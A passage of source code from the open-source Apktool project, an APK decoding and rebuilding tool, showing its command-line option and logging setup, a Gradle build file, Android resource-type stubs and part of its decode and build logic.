            decodeOptions.addOption(apiLevelOption);
            decodeOptions.addOption(noAssetOption);
            decodeOptions.addOption(forceManOption);

            buildOptions.addOption(apiLevelOption);
            buildOptions.addOption(debugBuiOption);
            buildOptions.addOption(netSecConfOption);
            buildOptions.addOption(aaptOption);
            buildOptions.addOption(originalOption);
            buildOptions.addOption(aapt2Option);
            buildOptions.addOption(noCrunchOption);
        }

        // add global options
        normalOptions.addOption(versionOption);
        normalOptions.addOption(advanceOption);

        // add basic decode options
        decodeOptions.addOption(frameTagOption);
        decodeOptions.addOption(outputDecOption);
        decodeOptions.addOption(frameDirOption);
        decodeOptions.addOption(forceDecOption);
        decodeOptions.addOption(noSrcOption);
        decodeOptions.addOption(noResOption);

        // add basic build options
        buildOptions.addOption(outputBuiOption);
        buildOptions.addOption(frameDirOption);
        buildOptions.addOption(forceBuiOption);

        // add basic framework options
        frameOptions.addOption(tagOption);
        frameOptions.addOption(frameIfDirOption);

        // add empty framework options
        emptyFrameworkOptions.addOption(forceDecOption);
        emptyFrameworkOptions.addOption(frameIfDirOption);

        // add list framework options
        listFrameworkOptions.addOption(frameIfDirOption);

        // add all, loop existing cats then manually add advance
        for (Option op : normalOptions.getOptions()) {
            allOptions.addOption(op);
        }
        for (Option op : decodeOptions.getOptions()) {
            allOptions.addOption(op);
        }
        for (Option op : buildOptions.getOptions()) {
            allOptions.addOption(op);
        }
        for (Option op : frameOptions.getOptions()) {
            allOptions.addOption(op);
        }
        allOptions.addOption(apiLevelOption);
        allOptions.addOption(analysisOption);
        allOptions.addOption(debugDecOption);
        allOptions.addOption(noDbgOption);
        allOptions.addOption(forceManOption);
        allOptions.addOption(noAssetOption);
        allOptions.addOption(keepResOption);
        allOptions.addOption(debugBuiOption);
        allOptions.addOption(netSecConfOption);
        allOptions.addOption(aaptOption);
        allOptions.addOption(originalOption);
        allOptions.addOption(verboseOption);
        allOptions.addOption(quietOption);
        allOptions.addOption(aapt2Option);
        allOptions.addOption(noCrunchOption);
        allOptions.addOption(onlyMainClassesOption);
    }

    private static String verbosityHelp() {
        if (isAdvanceMode()) {
            return "[-q|--quiet OR -v|--verbose] ";
        } else {
            return "";
        }
    }

    private static void usage() {
        _Options();
        HelpFormatter formatter = new HelpFormatter();
        formatter.setWidth(120);

        // print out license info prior to formatter.
        System.out.println(
                "Apktool v" + Androlib.getVersion() + " - a tool for reengineering Android apk files\n" +
                        "with smali v" + ApktoolProperties.get("smaliVersion") +
                        " and baksmali v" + ApktoolProperties.get("baksmaliVersion") + "\n" +
                        "Copyright 2010 Ryszard Wiśniewski <brut.alll@gmail.com>\n" +
                        "Copyright 2010 Connor Tumbleson <connor.tumbleson@gmail.com>" );
        if (isAdvanceMode()) {
            System.out.println("Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0)\n");
        }else {
            System.out.println();
        }

        // 4 usage outputs (general, frameworks, decode, build)
        formatter.printHelp("apktool " + verbosityHelp(), normalOptions);
        formatter.printHelp("apktool " + verbosityHelp() + "if|install-framework [options] <framework.apk>", frameOptions);
        formatter.printHelp("apktool " + verbosityHelp() + "d[ecode] [options] <file_apk>", decodeOptions);
        formatter.printHelp("apktool " + verbosityHelp() + "b[uild] [options] <app_path>", buildOptions);
        if (isAdvanceMode()) {
            formatter.printHelp("apktool " + verbosityHelp() + "publicize-resources <file_path>", emptyOptions);
            formatter.printHelp("apktool " + verbosityHelp() + "empty-framework-dir [options]", emptyFrameworkOptions);
            formatter.printHelp("apktool " + verbosityHelp() + "list-frameworks [options]", listFrameworkOptions);
        }
        System.out.println();

        // print out more information
        System.out.println(
                "For additional info, see: https://ibotpeaches.github.io/Apktool/ \n"
                        + "For smali/baksmali info, see: https://github.com/JesusFreke/smali");
    }

    private static void setupLogging(final Verbosity verbosity) {
        Logger logger = Logger.getLogger("");
        for (Handler handler : logger.getHandlers()) {
            logger.removeHandler(handler);
        }
        LogManager.getLogManager().reset();

        if (verbosity == Verbosity.QUIET) {
            return;
        }

        Handler handler = new Handler(){
            @Override
            public void publish(LogRecord record) {
                if (getFormatter() == null) {
                    setFormatter(new SimpleFormatter());
                }

                try {
                    String message = getFormatter().format(record);
                    if (record.getLevel().intValue() >= Level.WARNING.intValue()) {
                        System.err.write(message.getBytes());
                    } else {
                        if (record.getLevel().intValue() >= Level.INFO.intValue()) {
                            System.out.write(message.getBytes());
                        } else {
                            if (verbosity == Verbosity.VERBOSE) {
                                System.out.write(message.getBytes());
                            }
                        }
                    }
                } catch (Exception exception) {
                    reportError(null, exception, ErrorManager.FORMAT_FAILURE);
                }
            }
            @Override
            public void close() throws SecurityException {}
            @Override
            public void flush(){}
        };

        logger.addHandler(handler);

        if (verbosity == Verbosity.VERBOSE) {
            handler.setLevel(Level.ALL);
            logger.setLevel(Level.ALL);
        } else {
            handler.setFormatter(new Formatter() {
                @Override
                public String format(LogRecord record) {
                    return record.getLevel().toString().charAt(0) + ": "
                            + record.getMessage()
                            + System.getProperty("line.separator");
                }
            });
        }
    }

    private static boolean isAdvanceMode() {
        return advanceMode;
    }

    private static void setAdvanceMode() {
        Main.advanceMode = true;
    }

    private enum Verbosity {
        NORMAL, VERBOSE, QUIET
    }

    private static boolean advanceMode = false;

    private final static Options normalOptions;
    private final static Options decodeOptions;
    private final static Options buildOptions;
    private final static Options frameOptions;
    private final static Options allOptions;
    private final static Options emptyOptions;
    private final static Options emptyFrameworkOptions;
    private final static Options listFrameworkOptions;

    static {
        //normal and advance usage output
        normalOptions = new Options();
        buildOptions = new Options();
        decodeOptions = new Options();
        frameOptions = new Options();
        allOptions = new Options();
        emptyOptions = new Options();
        emptyFrameworkOptions = new Options();
        listFrameworkOptions = new Options();
    }
}

```

`brut.apktool/apktool-lib/build.gradle`:

```gradle
/**
 *  Copyright 2014 Ryszard Wiśniewski <brut.alll@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
import org.apache.tools.ant.filters.*

apply plugin: 'java-library'

processResources {
  from('src/main/resources/properties') {
    include '**/*.properties'
    into 'properties'
    filter(ReplaceTokens, tokens: [version: project.apktool_version, gitrev: project.hash] )
    duplicatesStrategy = DuplicatesStrategy.INCLUDE
  }
  from('src/main/resources/') {
    include '**/*.jar'
    duplicatesStrategy = DuplicatesStrategy.INCLUDE
  }

  includeEmptyDirs = false
}

dependencies {
    testImplementation depends.junit

    api project(':brut.j.dir'),
        project(':brut.j.util'),
        project(':brut.j.common')

    implementation depends.baksmali,
                   depends.smali,
                   depends.snakeyaml,
                   depends.xmlpull,
                   depends.guava,
                   depends.commons_lang,
                   depends.commons_io,
                   depends.commons_text

    testImplementation depends.xmlunit
}

```

`brut.apktool/apktool-lib/src/main/java/android/content/res/XmlResourceParser.java`:

```java
/*
 * Copyright (C) 2006 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package android.content.res;

import android.util.AttributeSet;
import org.xmlpull.v1.XmlPullParser;

/**
 * The XML parsing interface returned for an XML resource. This is a standard
 * XmlPullParser interface, as well as an extended AttributeSet interface and an
 * additional close() method on this interface for the client to indicate when
 * it is done reading the resource.
 */
public interface XmlResourceParser extends XmlPullParser, AttributeSet {
    /**
     * Close this interface to the resource. Calls on the interface are no
     * longer value after this call.
     */
    void close();
}

```

`brut.apktool/apktool-lib/src/main/java/android/util/AttributeSet.java`:

```java
/*
 * Copyright 2008 Android4ME / Dmitry Skiba
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package android.util;

public interface AttributeSet {
    int getAttributeCount();

    String getAttributeName(int index);

    String getAttributeValue(int index);

    String getPositionDescription();

    int getAttributeNameResource(int index);

    int getAttributeListValue(int index, String[] options, int defaultValue);

    boolean getAttributeBooleanValue(int index, boolean defaultValue);

    int getAttributeResourceValue(int index, int defaultValue);

    int getAttributeIntValue(int index, int defaultValue);

    int getAttributeUnsignedIntValue(int index, int defaultValue);

    float getAttributeFloatValue(int index, float defaultValue);

    String getIdAttribute();

    String getClassAttribute();

    int getIdAttributeResourceValue(int index);

    int getStyleAttribute();

    String getAttributeValue(String namespace, String attribute);

    int getAttributeListValue(String namespace, String attribute, String[] options, int defaultValue);

    boolean getAttributeBooleanValue(String namespace, String attribute, boolean defaultValue);

    int getAttributeResourceValue(String namespace, String attribute, int defaultValue);

    int getAttributeIntValue(String namespace, String attribute, int defaultValue);

    int getAttributeUnsignedIntValue(String namespace, String attribute, int defaultValue);

    float getAttributeFloatValue(String namespace, String attribute, float defaultValue);

    // TODO: remove
    int getAttributeValueType(int index);

    int getAttributeValueData(int index);
}

```

`brut.apktool/apktool-lib/src/main/java/android/util/TypedValue.java`:

```java
/*
 * Copyright (C) 2007 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package android.util;

/**
 * Container for a dynamically typed data value. Primarily used with
 * Resources for holding resource values.
 */
public class TypedValue {
    /** The value contains no data. */
    public static final int TYPE_NULL = 0x00;

    /** The <var>data</var> field holds a resource identifier. */
    public static final int TYPE_REFERENCE = 0x01;
    /**
     * The <var>data</var> field holds an attribute resource identifier
     * (referencing an attribute in the current theme style, not a resource
     * entry).
     */
    public static final int TYPE_ATTRIBUTE = 0x02;
    /**
     * The <var>string</var> field holds string data. In addition, if
     * <var>data</var> is non-zero then it is the string block index of the
     * string and <var>assetCookie</var> is the set of assets the string came
     * from.
     */
    public static final int TYPE_STRING = 0x03;
    /** The <var>data</var> field holds an IEEE 754 floating point number. */
    public static final int TYPE_FLOAT = 0x04;
    /**
     * The <var>data</var> field holds a complex number encoding a dimension
     * value.
     */
    public static final int TYPE_DIMENSION = 0x05;
    /**
     * The <var>data</var> field holds a complex number encoding a fraction of a
     * container.
     */
    public static final int TYPE_FRACTION = 0x06;
    /**
     * The <var>data</var> holds a dynamic res table reference, which needs to be
     * resolved before it can be used like TYPE_REFERENCE
     */
    public static final int TYPE_DYNAMIC_REFERENCE = 0x07;
    /**
     * The <var>data</var> an attribute resource identifier, which needs to be resolved
     * before it can be used like a TYPE_ATTRIBUTE.
     */
    public static final int TYPE_DYNAMIC_ATTRIBUTE = 0x08;
    /**
     * Identifies the start of plain integer values. Any type value from this to
     * {@link #TYPE_LAST_INT} means the <var>data</var> field holds a generic
     * integer value.
     */
    public static final int TYPE_FIRST_INT = 0x10;

    /**
     * The <var>data</var> field holds a number that was originally specified in
     * decimal.
     */
    public static final int TYPE_INT_DEC = 0x10;
    /**
     * The <var>data</var> field holds a number that was originally specified in
     * hexadecimal (0xn).
     */
    public static final int TYPE_INT_HEX = 0x11;
    /**
     * The <var>data</var> field holds 0 or 1 that was originally specified as
     * "false" or "true".
     */
    public static final int TYPE_INT_BOOLEAN = 0x12;

    /**
     * Identifies the start of integer values that were specified as color
     * constants (starting with '#').
     */
    public static final int TYPE_FIRST_COLOR_INT = 0x1c;

    /**
     * The <var>data</var> field holds a color that was originally specified as
     * #aarrggbb.
     */
    public static final int TYPE_INT_COLOR_ARGB8 = 0x1c;
    /**
     * The <var>data</var> field holds a color that was originally specified as
     * #rrggbb.
     */
    public static final int TYPE_INT_COLOR_RGB8 = 0x1d;
    /**
     * The <var>data</var> field holds a color that was originally specified as
     * #argb.
     */
    public static final int TYPE_INT_COLOR_ARGB4 = 0x1e;
    /**
     * The <var>data</var> field holds a color that was originally specified as
     * #rgb.
     */
    public static final int TYPE_INT_COLOR_RGB4 = 0x1f;

    /**
     * Identifies the end of integer values that were specified as color
     * constants.
     */
    public static final int TYPE_LAST_COLOR_INT = 0x1f;

    /** Identifies the end of plain integer values. */
    public static final int TYPE_LAST_INT = 0x1f;

	/* ------------------------------------------------------------ */

    /** Complex data: bit location of unit information. */
    public static final int COMPLEX_UNIT_SHIFT = 0;
    /**
     * Complex data: mask to extract unit information (after shifting by
     * {@link #COMPLEX_UNIT_SHIFT}). This gives us 16 possible types, as defined
     * below.
     */
    public static final int COMPLEX_UNIT_MASK = 0xf;

    /** {@link #TYPE_DIMENSION} complex unit: Value is raw pixels. */
    public static final int COMPLEX_UNIT_PX = 0;
    /**
     * {@link #TYPE_DIMENSION} complex unit: Value is Device Independent Pixels.
     */
    public static final int COMPLEX_UNIT_DIP = 1;
    /** {@link #TYPE_DIMENSION} complex unit: Value is a scaled pixel. */
    public static final int COMPLEX_UNIT_SP = 2;
    /** {@link #TYPE_DIMENSION} complex unit: Value is in points. */
    public static final int COMPLEX_UNIT_PT = 3;
    /** {@link #TYPE_DIMENSION} complex unit: Value is in inches. */
    public static final int COMPLEX_UNIT_IN = 4;
    /** {@link #TYPE_DIMENSION} complex unit: Value is in millimeters. */
    public static final int COMPLEX_UNIT_MM = 5;

    /**
     * {@link #TYPE_FRACTION} complex unit: A basic fraction of the overall size.
     */
    public static final int COMPLEX_UNIT_FRACTION = 0;
    /** {@link #TYPE_FRACTION} complex unit: A fraction of the parent size. */
    public static final int COMPLEX_UNIT_FRACTION_PARENT = 1;

    /**
     * Complex data: where the radix information is, telling where the decimal
     * place appears in the mantissa.
     */
    public static final int COMPLEX_RADIX_SHIFT = 4;
    /**
     * Complex data: mask to extract radix information (after shifting by
     * {@link #COMPLEX_RADIX_SHIFT}). This give us 4 possible fixed point
     * representations as defined below.
     */
    public static final int COMPLEX_RADIX_MASK = 0x3;

    /** Complex data: the mantissa is an integral number -- i.e., 0xnnnnnn.0 */
    public static final int COMPLEX_RADIX_23p0 = 0;
    /** Complex data: the mantissa magnitude is 16 bits -- i.e, 0xnnnn.nn */
    public static final int COMPLEX_RADIX_16p7 = 1;
    /** Complex data: the mantissa magnitude is 8 bits -- i.e, 0xnn.nnnn */
    public static final int COMPLEX_RADIX_8p15 = 2;
    /** Complex data: the mantissa magnitude is 0 bits -- i.e, 0x0.nnnnnn */
    public static final int COMPLEX_RADIX_0p23 = 3;

    /** Complex data: bit location of mantissa information. */
    public static final int COMPLEX_MANTISSA_SHIFT = 8;
    /**
     * Complex data: mask to extract mantissa information (after shifting by
     * {@link #COMPLEX_MANTISSA_SHIFT}). This gives us 23 bits of precision; the
     * top bit is the sign.
     */
    public static final int COMPLEX_MANTISSA_MASK = 0xffffff;

	/* ------------------------------------------------------------ */

    /**
     * {@link #TYPE_NULL} data indicating the value was not specified.
     */
    public static final int DATA_NULL_UNDEFINED = 0;
    /**
     * {@link #TYPE_NULL} data indicating the value was explicitly set to null.
     */
    public static final int DATA_NULL_EMPTY = 1;

    /* ------------------------------------------------------------ */

    /**
     * If density is equal to this value, then the density should be
     * treated as the system's default density value:
     */
    public static final int DENSITY_DEFAULT = 0;

    /**
     * If density is equal to this value, then there is no density
     * associated with the resource and it should not be scaled.
     */
    public static final int DENSITY_NONE = 0xffff;

	/* ------------------------------------------------------------ */

    /**
     * The type held by this value, as defined by the constants here. This tells
     * you how to interpret the other fields in the object.
     */
    public int type;

    private static final float MANTISSA_MULT = 1.0f / (1 << TypedValue.COMPLEX_MANTISSA_SHIFT);
    private static final float[] RADIX_MULTS = new float[] {
        MANTISSA_MULT, 1.0f / (1 << 7) * MANTISSA_MULT,
            1.0f / (1 << 15) * MANTISSA_MULT, 1.0f / (1 << 23) * MANTISSA_MULT };

    /**
     * Retrieve the base value from a complex data integer. This uses the
     * {@link #COMPLEX_MANTISSA_MASK} and {@link #COMPLEX_RADIX_MASK} fields of
     * the data to compute a floating point representation of the number they
     * describe. The units are ignored.
     *
     * @param complex
     *            A complex data value.
     *
     * @return A floating point value corresponding to the complex data.
     */
    public static float complexToFloat(int complex) {
        return (complex & (TypedValue.COMPLEX_MANTISSA_MASK << TypedValue.COMPLEX_MANTISSA_SHIFT))
                * RADIX_MULTS[(complex >> TypedValue.COMPLEX_RADIX_SHIFT)
                & TypedValue.COMPLEX_RADIX_MASK];
    }

    private static final String[] DIMENSION_UNIT_STRS = new String[] { "px",
            "dip", "sp", "pt", "in", "mm" };
    private static final String[] FRACTION_UNIT_STRS = new String[] { "%", "%p" };

    /**
     * Perform type conversion as per coerceToString on an explicitly
     * supplied type and data.
     *
     * @param type The data type identifier.
     * @param data The data value.
     *
     * @return String The coerced string value. If the value is null or the type
     *         is not known, null is returned.
     */
    public static String coerceToString(int type, int data) {
        switch (type) {
            case TYPE_NULL:
                return null;
            case TYPE_REFERENCE:
                return "@" + data;
            case TYPE_ATTRIBUTE:
                return "?" + data;
            case TYPE_FLOAT:
                return Float.toString(Float.intBitsToFloat(data));
            case TYPE_DIMENSION:
                return complexToFloat(data)
                        + DIMENSION_UNIT_STRS[(data >> COMPLEX_UNIT_SHIFT)
                        & COMPLEX_UNIT_MASK];
            case TYPE_FRACTION:
                return complexToFloat(data) * 100
                        + FRACTION_UNIT_STRS[(data >> COMPLEX_UNIT_SHIFT)
                        & COMPLEX_UNIT_MASK];
            case TYPE_INT_HEX:
                return String.format("0x%08X", data);
            case TYPE_INT_BOOLEAN:
                return data != 0 ? "true" : "false";
        }

        if (type >= TYPE_FIRST_COLOR_INT && type <= TYPE_LAST_COLOR_INT) {
            String res = String.format("%08x", data);
            char[] vals = res.toCharArray();
            switch (type) {
                default:
                case TYPE_INT_COLOR_ARGB8:// #AaRrGgBb
                    break;
                case TYPE_INT_COLOR_RGB8:// #FFRrGgBb->#RrGgBb
                    res = res.substring(2);
                    break;
                case TYPE_INT_COLOR_ARGB4:// #AARRGGBB->#ARGB
                    res = String.valueOf(vals[0]) + vals[2] +
                        vals[4] + vals[6];
                    break;
                case TYPE_INT_COLOR_RGB4:// #FFRRGGBB->#RGB
                    res = String.valueOf(vals[2]) + vals[4] +
                        vals[6];
                    break;
            }
            return "#" + res;
        } else if (type >= TYPE_FIRST_INT && type <= TYPE_LAST_INT) {
            String res = null;
            if (type == TYPE_INT_DEC) {
                res = Integer.toString(data);
            }
            return res;
        }

        return null;
    }

}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/Androlib.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.meta.MetaInfo;
import brut.androlib.meta.UsesFramework;
import brut.androlib.options.BuildOptions;
import brut.androlib.res.AndrolibResources;
import brut.androlib.res.data.ResConfigFlags;
import brut.androlib.res.data.ResPackage;
import brut.androlib.res.data.ResTable;
import brut.androlib.res.data.ResUnknownFiles;
import brut.common.InvalidUnknownFileException;
import brut.common.RootUnknownFileException;
import brut.common.TraversalUnknownFileException;
import brut.androlib.res.xml.ResXmlPatcher;
import brut.androlib.src.SmaliBuilder;
import brut.androlib.src.SmaliDecoder;
import brut.common.BrutException;
import brut.directory.*;
import brut.util.*;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.FilenameUtils;
import org.jf.dexlib2.iface.DexFile;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;
import java.io.*;
import java.util.*;
import java.util.logging.Logger;
import java.util.regex.Pattern;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class Androlib {
    private final AndrolibResources mAndRes = new AndrolibResources();
    protected final ResUnknownFiles mResUnknownFiles = new ResUnknownFiles();
    public final BuildOptions buildOptions;
    private int mMinSdkVersion = 0;

    public Androlib() {
        this(new BuildOptions());
    }

    public Androlib(BuildOptions buildOptions) {
        this.buildOptions = buildOptions;
        mAndRes.buildOptions = buildOptions;
    }

    public ResTable getResTable(ExtFile apkFile)
            throws AndrolibException {
        return mAndRes.getResTable(apkFile, true);
    }

    public ResTable getResTable(ExtFile apkFile, boolean loadMainPkg)
            throws AndrolibException {
        return mAndRes.getResTable(apkFile, loadMainPkg);
    }

    public int getMinSdkVersion() {
        return mMinSdkVersion;
    }

    public void decodeSourcesRaw(ExtFile apkFile, File outDir, String filename)
            throws AndrolibException {
        try {
            LOGGER.info("Copying raw " + filename + " file...");
            apkFile.getDirectory().copyToDir(outDir, filename);
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void decodeSourcesSmali(File apkFile, File outDir, String filename, boolean bakDeb, int apiLevel)
            throws AndrolibException {
        try {
            File smaliDir;
            if (filename.equalsIgnoreCase("classes.dex")) {
                smaliDir = new File(outDir, SMALI_DIRNAME);
            } else {
                smaliDir = new File(outDir, SMALI_DIRNAME + "_" + filename.substring(0, filename.indexOf(".")));
            }
            OS.rmdir(smaliDir);
            smaliDir.mkdirs();
            LOGGER.info("Baksmaling " + filename + "...");
            DexFile dexFile = SmaliDecoder.decode(apkFile, smaliDir, filename, bakDeb, apiLevel);
            int minSdkVersion = dexFile.getOpcodes().api;
            if (mMinSdkVersion == 0 || mMinSdkVersion > minSdkVersion) {
                mMinSdkVersion = minSdkVersion;
            }
        } catch (BrutException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void decodeManifestRaw(ExtFile apkFile, File outDir)
            throws AndrolibException {
        try {
            LOGGER.info("Copying raw manifest...");
            apkFile.getDirectory().copyToDir(outDir, APK_MANIFEST_FILENAMES);
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void decodeManifestFull(ExtFile apkFile, File outDir, ResTable resTable)
            throws AndrolibException {
        mAndRes.decodeManifest(resTable, apkFile, outDir);
    }

    public void decodeResourcesRaw(ExtFile apkFile, File outDir)
            throws AndrolibException {
        try {
            LOGGER.info("Copying raw resources...");
            apkFile.getDirectory().copyToDir(outDir, APK_RESOURCES_FILENAMES);
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void decodeResourcesFull(ExtFile apkFile, File outDir, ResTable resTable)
            throws AndrolibException {
        mAndRes.decode(resTable, apkFile, outDir);
    }

    public void decodeManifestWithResources(ExtFile apkFile, File outDir, ResTable resTable)
            throws AndrolibException {
        mAndRes.decodeManifestWithResources(resTable, apkFile, outDir);
    }

    public void decodeRawFiles(ExtFile apkFile, File outDir, short decodeAssetMode)
            throws AndrolibException {
        LOGGER.info("Copying assets and libs...");
        try {
            Directory in = apkFile.getDirectory();

            if (decodeAssetMode == ApkDecoder.DECODE_ASSETS_FULL) {
                if (in.containsDir("assets")) {
                    in.copyToDir(outDir, "assets");
                }
            }
            if (in.containsDir("lib")) {
                in.copyToDir(outDir, "lib");
            }
            if (in.containsDir("libs")) {
                in.copyToDir(outDir, "libs");
            }
            if (in.containsDir("kotlin")) {
                in.copyToDir(outDir, "kotlin");
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void recordUncompressedFiles(ExtFile apkFile, Collection<String> uncompressedFilesOrExts) throws AndrolibException {
        try {
            Directory unk = apkFile.getDirectory();
            Set<String> files = unk.getFiles(true);

            for (String file : files) {
                if (isAPKFileNames(file) && unk.getCompressionLevel(file) == 0) {
                    String ext = "";
                    if (unk.getSize(file) != 0) {
                        ext = FilenameUtils.getExtension(file);
                    }

                    if (ext.isEmpty() || !NO_COMPRESS_PATTERN.matcher(ext).find()) {
                        ext = file;
                    }
                    if (!uncompressedFilesOrExts.contains(ext)) {
                        uncompressedFilesOrExts.add(ext);
                    }
                }
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    private boolean isAPKFileNames(String file) {
        for (String apkFile : APK_STANDARD_ALL_FILENAMES) {
            if (apkFile.equals(file) || file.startsWith(apkFile + "/")) {
                return true;
            }
        }
        return false;
    }

    public void decodeUnknownFiles(ExtFile apkFile, File outDir)
            throws AndrolibException {
        LOGGER.info("Copying unknown files...");
        File unknownOut = new File(outDir, UNK_DIRNAME);
        try {
            Directory unk = apkFile.getDirectory();

            // loop all items in container recursively, ignoring any that are pre-defined by aapt
            Set<String> files = unk.getFiles(true);
            for (String file : files) {
                if (!isAPKFileNames(file) && !file.endsWith(".dex")) {

                    // copy file out of archive into special "unknown" folder
                    unk.copyToDir(unknownOut, file);
                    // lets record the name of the file, and its compression type
                    // so that we may re-include it the same way
                    mResUnknownFiles.addUnknownFileInfo(file, String.valueOf(unk.getCompressionLevel(file)));
                }
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void writeOriginalFiles(ExtFile apkFile, File outDir)
            throws AndrolibException {
        LOGGER.info("Copying original files...");
        File originalDir = new File(outDir, "original");
        if (!originalDir.exists()) {
            originalDir.mkdirs();
        }

        try {
            Directory in = apkFile.getDirectory();
            if (in.containsFile("AndroidManifest.xml")) {
                in.copyToDir(originalDir, "AndroidManifest.xml");
            }
            if (in.containsFile("stamp-cert-sha256")) {
                in.copyToDir(originalDir, "stamp-cert-sha256");
            }
            if (in.containsDir("META-INF")) {
                in.copyToDir(originalDir, "META-INF");

                if (in.containsDir("META-INF/services")) {
                    // If the original APK contains the folder META-INF/services folder
                    // that is used for service locators (like coroutines on android),
                    // copy it to the destination folder so it does not get dropped.
                    LOGGER.info("Copying META-INF/services directory");
                    in.copyToDir(outDir, "META-INF/services");
                }
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void writeMetaFile(File mOutDir, MetaInfo meta)
            throws AndrolibException {
        try {
            meta.save(new File(mOutDir, "apktool.yml"));
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }
    }

    public MetaInfo readMetaFile(ExtFile appDir)
            throws AndrolibException {
        try(
                InputStream in = appDir.getDirectory().getFileInput("apktool.yml")
        ) {
            return MetaInfo.load(in);
        } catch (DirectoryException | IOException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void build(File appDir, File outFile) throws BrutException {
        build(new ExtFile(appDir), outFile);
    }

    public void build(ExtFile appDir, File outFile)
            throws BrutException {
        LOGGER.info("Using Apktool " + Androlib.getVersion());

        MetaInfo meta = readMetaFile(appDir);
        buildOptions.isFramework = meta.isFrameworkApk;
        buildOptions.resourcesAreCompressed = meta.compressionType;
        buildOptions.doNotCompress = meta.doNotCompress;

        mAndRes.setSdkInfo(meta.sdkInfo);
        mAndRes.setPackageId(meta.packageInfo);
        mAndRes.setPackageRenamed(meta.packageInfo);
        mAndRes.setVersionInfo(meta.versionInfo);
        mAndRes.setSharedLibrary(meta.sharedLibrary);
        mAndRes.setSparseResources(meta.sparseResources);

        if (meta.sdkInfo != null && meta.sdkInfo.get("minSdkVersion") != null) {
            String minSdkVersion = meta.sdkInfo.get("minSdkVersion");
            mMinSdkVersion = mAndRes.getMinSdkVersionFromAndroidCodename(meta, minSdkVersion);
        }

        if (outFile == null) {
            String outFileName = meta.apkFileName;
            outFile = new File(appDir, "dist" + File.separator + (outFileName == null ? "out.apk" : outFileName));
        }

        new File(appDir, APK_DIRNAME).mkdirs();
        File manifest = new File(appDir, "AndroidManifest.xml");
        File manifestOriginal = new File(appDir, "AndroidManifest.xml.orig");

        buildSources(appDir);
        buildNonDefaultSources(appDir);
        buildManifestFile(appDir, manifest, manifestOriginal);
        buildResources(appDir, meta.usesFramework);
        buildLibs(appDir);
        buildCopyOriginalFiles(appDir);
        buildApk(appDir, outFile);

        // we must go after the Apk is built, and copy the files in via Zip
        // this is because Aapt won't add files it doesn't know (ex unknown files)
        buildUnknownFiles(appDir, outFile, meta);

        // we copied the AndroidManifest.xml to AndroidManifest.xml.orig so we can edit it
        // lets restore the unedited one, to not change the original
        if (manifest.isFile() && manifest.exists() && manifestOriginal.isFile()) {
            try {
                if (new File(appDir, "AndroidManifest.xml").delete()) {
                    FileUtils.moveFile(manifestOriginal, manifest);
                }
            } catch (IOException ex) {
                throw new AndrolibException(ex.getMessage());
            }
        }
        LOGGER.info("Built apk into: " + outFile.getPath());
    }

    private void buildManifestFile(File appDir, File manifest, File manifestOriginal)
            throws AndrolibException {

        // If we decoded in "raw", we cannot patch AndroidManifest
        if (new File(appDir, "resources.arsc").exists()) {
            return;
        }
        if (manifest.isFile() && manifest.exists()) {
            try {
                if (manifestOriginal.exists()) {
                    manifestOriginal.delete();
                }
                FileUtils.copyFile(manifest, manifestOriginal);
